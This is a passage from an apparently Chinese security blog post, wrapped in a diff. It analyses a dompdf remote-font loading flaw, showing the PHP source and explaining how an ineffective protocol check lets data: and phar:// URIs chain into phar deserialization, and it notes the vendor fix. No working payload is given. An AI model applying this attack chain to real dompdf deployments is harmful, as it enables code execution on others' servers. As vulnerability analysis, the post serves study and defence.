class="string">&#x27;us-ascii//TRANSLIT&#x27;</span>, <span class="variable">$prefix</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$prefix_encoding</span> = <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$prefix</span>, <span class="title function_ invoke__">mb_detect_order</span>(), <span class="literal">true</span>);</span><br><span class="line">	<span class="variable">$substchar</span> = <span class="title function_ invoke__">mb_substitute_character</span>();</span><br><span class="line">	<span class="title function_ invoke__">mb_substitute_character</span>(<span class="number">0x005F</span>);</span><br><span class="line">	<span class="variable">$prefix</span> = <span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$prefix</span>, <span class="string">&quot;ISO-8859-1&quot;</span>, <span class="variable">$prefix_encoding</span>);</span><br><span class="line">	<span class="title function_ invoke__">mb_substitute_character</span>(<span class="variable">$substchar</span>);</span><br><span class="line">	<span class="variable">$prefix</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;[\W]&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="variable">$prefix</span>);</span><br><span class="line">	<span class="variable">$prefix</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^-_\w]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$prefix</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$localFile</span> = <span class="variable">$prefix</span> . <span class="string">&quot;_&quot;</span> . <span class="variable">$remoteHash</span>;</span><br><span class="line">	<span class="variable">$localFilePath</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getOptions</span>()-&gt;<span class="title function_ invoke__">getFontDir</span>() . <span class="string">&quot;/&quot;</span> . <span class="variable">$localFile</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$entry</span>[<span class="variable">$styleString</span>]) &amp;&amp; <span class="variable">$localFilePath</span> == <span class="variable">$entry</span>[<span class="variable">$styleString</span>]) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="variable">$entry</span>[<span class="variable">$styleString</span>] = <span class="variable">$localFile</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Download the remote file</span></span><br><span class="line">	[<span class="variable">$protocol</span>] = <span class="title class_">Helpers</span>::<span class="title function_ invoke__">explode_url</span>(<span class="variable">$remoteFile</span>);</span><br><span class="line">	<span class="variable">$allowed_protocols</span> = <span class="variable language_">$this</span>-&gt;options-&gt;<span class="title function_ invoke__">getAllowedProtocols</span>();</span><br><span class="line">	<span class="keyword">if</span> (!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$protocol</span>, <span class="variable">$allowed_protocols</span>)) &#123;</span><br><span class="line">		<span class="title class_">Helpers</span>::<span class="title function_ invoke__">record_warnings</span>(E_USER_WARNING, <span class="string">&quot;Permission denied on <span class="subst">$remoteFile</span>. The communication protocol is not supported.&quot;</span>, <span class="keyword">__FILE__</span>, <span class="keyword">__LINE__</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$allowed_protocols</span>[<span class="variable">$protocol</span>][<span class="string">&quot;rules&quot;</span>] <span class="keyword">as</span> <span class="variable">$rule</span>) &#123;</span><br><span class="line">		[<span class="variable">$result</span>, <span class="variable">$message</span>] = <span class="variable">$rule</span>(<span class="variable">$remoteFile</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">true</span>) &#123;</span><br><span class="line">			<span class="title class_">Helpers</span>::<span class="title function_ invoke__">record_warnings</span>(E_USER_WARNING, <span class="string">&quot;Error loading <span class="subst">$remoteFile</span>: <span class="subst">$message</span>&quot;</span>, <span class="keyword">__FILE__</span>, <span class="keyword">__LINE__</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">list</span>(<span class="variable">$remoteFileContent</span>, <span class="variable">$http_response_header</span>) = @<span class="title class_">Helpers</span>::<span class="title function_ invoke__">getFileContent</span>(<span class="variable">$remoteFile</span>, <span class="variable">$context</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$remoteFileContent</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$localTempFile</span> = @<span class="title function_ invoke__">tempnam</span>(<span class="variable">$this</span>-&gt;options-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&quot;tempDir&quot;</span>), <span class="string">&quot;dompdf-font-&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$localTempFile</span>, <span class="variable">$remoteFileContent</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$font</span> = <span class="title class_">Font</span>::<span class="title function_ invoke__">load</span>(<span class="variable">$localTempFile</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="variable">$font</span>) &#123;</span><br><span class="line">		<span class="title function_ invoke__">unlink</span>(<span class="variable">$localTempFile</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$font</span>-&gt;<span class="title function_ invoke__">parse</span>();</span><br><span class="line">	<span class="variable">$font</span>-&gt;<span class="title function_ invoke__">saveAdobeFontMetrics</span>(<span class="string">&quot;<span class="subst">$localFilePath</span>.ufm&quot;</span>);</span><br><span class="line">	<span class="variable">$font</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">unlink</span>(<span class="variable">$localTempFile</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( !<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;<span class="subst">$localFilePath</span>.ufm&quot;</span>) ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$fontExtension</span> = <span class="string">&quot;.ttf&quot;</span>;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$font</span>-&gt;<span class="title function_ invoke__">getFontType</span>()) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;TrueType&quot;</span>:</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="variable">$fontExtension</span> = <span class="string">&quot;.ttf&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Save the changes</span></span><br><span class="line">	<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$localFilePath</span>.<span class="variable">$fontExtension</span>, <span class="variable">$remoteFileContent</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( !<span class="title function_ invoke__">file_exists</span>(<span class="variable">$localFilePath</span>.<span class="variable">$fontExtension</span>) ) &#123;</span><br><span class="line">		<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;<span class="subst">$localFilePath</span>.ufm&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setFontFamily</span>(<span class="variable">$fontname</span>, <span class="variable">$entry</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到生成的文件的命令方式<br><img src="https://s2.loli.net/2023/05/29/MlsI7GZOz9tQU4H.png" alt="filename.png"></p>
+<p>然后进行了协议校验，这里<code>allowed_protocols</code>根据代码其实并没有data协议，这里不知道为什么调试的时候会有，不过也不影响，可以看到这里即使验证不通过，代码只会抛出warning而不是立即结束，所以就意味这里的协议校验是无效的，此时使用phar协议传入内容，如果后面有相应的函数的话即可触发phar反序列化<br><img src="https://s2.loli.net/2023/05/29/v4RP5M1ChuKWB2I.png" alt="Pasted image 20230528144313.png"></p>
+<p>在该函数中果然存在文件写入，而file_put_contents是可以触发phar反序列化的，所以我们这里可以通过data协议写入文件，然后再通过phar协议访问来触发漏洞。<br><img src="https://s2.loli.net/2023/05/29/pbsECUc1tFOwzYG.png" alt="Pasted image 20230528142602.png"></p>
+<p>这样通过data协议写入文件之后，只要再次通过phar协议来访问写入的文件，然后当代码执行到file_get_contents函数时即可触发反序列化漏洞。</p>
+<p>在修复方案中，在判断结束之后直接进行函数返回。<br><img src="https://s2.loli.net/2023/05/29/ajQbfPLMqnW6cJ3.png" alt="Pasted image 20230528233025.png"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>aesm1p</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2023/05/29/dompdf/">http://example.com/2023/05/29/dompdf/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"># 命令执行</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2023/05/14/wdb2022SemiFinal/">2022第三届网鼎杯线下半决赛</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© aesm1p | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
